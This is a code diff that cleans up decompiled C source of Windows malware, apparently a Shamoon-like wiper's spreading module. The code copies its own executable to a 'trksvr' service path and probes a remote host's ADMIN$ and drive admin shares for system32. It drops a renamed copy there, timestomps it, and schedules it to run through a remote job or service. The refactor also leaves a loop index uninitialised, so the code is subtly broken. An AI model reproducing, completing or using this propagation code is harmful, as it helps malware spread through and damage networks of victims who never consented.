@@ -21,21 +21,21 @@
 
 bool CopyCurrentExecutableToTrkSvr()
 {
-	PVOID OlValue; // [sp+8h] [bp-26Ch]@5
 	WCHAR svc_path[256]; // [sp+Ch] [bp-268h]@1
 	WCHAR svc_name[50]; // [sp+20Ch] [bp-68h]@1
 	
 	if(!GetTrksrvServiceInfo(svc_name, svc_path))
 		return false;
 
-	OlValue = 0;
-	_Wow64DisableWow64FsRedirection(&OlValue);
+	PVOID oldValue = NULL;
+	_Wow64DisableWow64FsRedirection(&oldValue);
+
 	if(!g_argv || !CopyFileW(g_argv[0], svc_path, FALSE))
 	{
-		_Wow64RevertWow64FsRedirection(OlValue);
+		_Wow64RevertWow64FsRedirection(oldValue);
 		return false;
 	}
-	_Wow64RevertWow64FsRedirection(OlValue);
+	_Wow64RevertWow64FsRedirection(oldValue);
 	
 	SetReliableFileTime(svc_path);
 	if(ConfigureTrkSvr(0, svc_path))
@@ -45,57 +45,58 @@ bool CopyCurrentExecutableToTrkSvr()
 	return false;
 }
 
-bool WriteModuleOnSharedPC(const WCHAR *a1, const WCHAR *a2)
+bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 {
 	BOOL v16; // edi@6
 	const WCHAR *v17; // edi@8
 	WCHAR *v31; // [sp-8h] [bp-12D4h]@12
 	int v32; // [sp-4h] [bp-12D0h]@12
 	int v33; // [sp+10h] [bp-12BCh]@6
-	signed int v34; // [sp+14h] [bp-12B8h]@1
-	WCHAR *v35; // [sp+1Ch] [bp-12B0h]@1
 	int v36; // [sp+20h] [bp-12ACh]@1
 	signed int v37; // [sp+20h] [bp-12ACh]@6
 	bool v38; // [sp+27h] [bp-12A5h]@4
 	WCHAR v39[1024]; // [sp+28h] [bp-12A4h]@11
 	WCHAR v40[256]; // [sp+828h] [bp-AA4h]@10
 	WCHAR NewFileName[256]; // [sp+A28h] [bp-8A4h]@11
-	WCHAR v42[256]; // [sp+C28h] [bp-6A4h]@6
-	WCHAR svc_csrss[256]; // [sp+E28h] [bp-4A4h]@1
-	WCHAR ExistingFileName[256]; // [sp+1028h] [bp-2A4h]@1
-	WCHAR v47[6][15] = {L"ADMIN$", L"C$\\WINDOWS", L"D$\\WINDOWS", L"E$\\WINDOWS"}; // [sp+1228h] [bp-A4h]@1
+
+	WCHAR csrss_dir[256];
+	WCHAR svc_csrss[256];
+	WCHAR csrss_locations[6][15] = {L"ADMIN$", L"C$\\WINDOWS", L"D$\\WINDOWS", L"E$\\WINDOWS"};
+	
 	WCHAR v46[30]; // [sp+12A0h] [bp-2Ch]@1
 	
+	WCHAR ExistingFileName[256]; // = "\\" + arg2 + "\\"
+
 	strcpyW(ExistingFileName, L"\\\\", 4);
-	strcpyW(&ExistingFileName[2], a2, 2 * strlenW(a2));
-	strcpyW(&ExistingFileName[strlenW(a2) + 2], L"\\", 2);
-	ExistingFileName[strlenW(a2) + 3] = 0;
+	strcpyW(&ExistingFileName[2], remoteSrv, 2 * strlenW(remoteSrv));
+	strcpyW(&ExistingFileName[strlenW(remoteSrv) + 2], L"\\", 2);
+	ExistingFileName[strlenW(remoteSrv) + 3] = 0;
 	
-	v36 = strlenW(ExistingFileName);
-	memmove(svc_csrss, ExistingFileName, 2 * v36);
-	v34 = 0;
-	v35 = *v47;
+	int path_len = strlenW(ExistingFileName);
+	memmove(svc_csrss, ExistingFileName, 2 * path_len);
+	int idx;
+	// Iterate through the known locations for csrss.exe
+	WCHAR *location = *csrss_locations;
 	while(1)
 	{
-		memmove(&svc_csrss[v36], v35, 2 * strlenW(v35));
-		memmove(&svc_csrss[v36 + strlenW(v35)], L"\\system32\\csrss.exe", 2 * strlenW(L"\\system32\\csrss.exe"));
-		
-		svc_csrss[v36 + strlenW(v35) + strlenW(L"\\system32\\csrss.exe")] = 0;
+		memmove(&svc_csrss[path_len], location, 2 * strlenW(location));
+		memmove(&svc_csrss[path_len + strlenW(location)], L"\\system32\\csrss.exe", 2 * strlenW(L"\\system32\\csrss.exe"));
+		svc_csrss[path_len + strlenW(location) + strlenW(L"\\system32\\csrss.exe")] = 0;
+
 		if(IsFileAccessible(svc_csrss))
 			break;
 		
-		++v34;
-		v35 += 15;
-		if(v34 >= 4)
+		++idx;
+		location += 15;
+		if(idx >= 4)
 		{
-			v38 = 0;
-			return v38;
+			return false;
 		}
 	}
 	
-	memmove(&ExistingFileName[v36], v47[v34], 2 * strlenW(v47[v34]));
-	memmove(&ExistingFileName[v36 + strlenW(v47[v34])], L"\\system32\\", 2 * strlenW(L"\\system32\\") + 2);
-	memmove(v42, ExistingFileName, 2 * strlenW(ExistingFileName) + 2);
+	memmove(&ExistingFileName[path_len], csrss_locations[idx], 2 * strlenW(csrss_locations[idx]));
+	memmove(&ExistingFileName[path_len + strlenW(csrss_locations[idx])], L"\\system32\\", 2 * strlenW(L"\\system32\\") + 2);
+	memmove(csrss_dir, ExistingFileName, 2 * strlenW(ExistingFileName) + 2);
 	
 	v16 = 0;
 	v37 = 0;
@@ -111,7 +112,7 @@ bool WriteModuleOnSharedPC(const WCHAR *a1, const WCHAR *a2)
 		strcpyW(&v46[strlenW(v17)], L".exe", 2 * strlenW(L".exe") + 2);
 		strcpyW(&ExistingFileName[v33], v46, 2 * strlenW(v46) + 2);
 		
-		v16 = CopyFileW(a1, ExistingFileName, 1);
+		v16 = CopyFileW(inFile, ExistingFileName, 1);
 		SetReliableFileTime(ExistingFileName);
 		if(v37 >= 29)
 		{
@@ -124,16 +125,16 @@ bool WriteModuleOnSharedPC(const WCHAR *a1, const WCHAR *a2)
 	strcpyW(v40, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
 	strcpyW(&v40[strlenW(L"%SystemRoot%\\System32\\")], v46, 2 * strlenW(v46) + 2);
 	
-	if(AddNewJob(a2, v40))
+	if(AddNewJob(remoteSrv, v40))
 	{
 		v38 = 1;
 		return v38;
 	}
 	
-	AddNewJob(a2, v46);
+	AddNewJob(remoteSrv, v46);
 	
-	strcpyW(NewFileName, v42, 2 * strlenW(v42));
-	strcpyW(&NewFileName[strlenW(v42)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 2);
+	strcpyW(NewFileName, csrss_dir, 2 * strlenW(csrss_dir));
+	strcpyW(&NewFileName[strlenW(csrss_dir)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 2);
 	strcpyW(v39, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
 	DeleteFileW(NewFileName);
 	
@@ -150,7 +151,7 @@ bool WriteModuleOnSharedPC(const WCHAR *a1, const WCHAR *a2)
 	
 	strcpyW(&v39[strlenW(L"%SystemRoot%\\System32\\")], v31, v32);
 	
-	if(ConfigureTrkSvr(a2, v39))
+	if(ConfigureTrkSvr(remoteSrv, v39))
 	{
 		v38 = 1;
 		return v38;
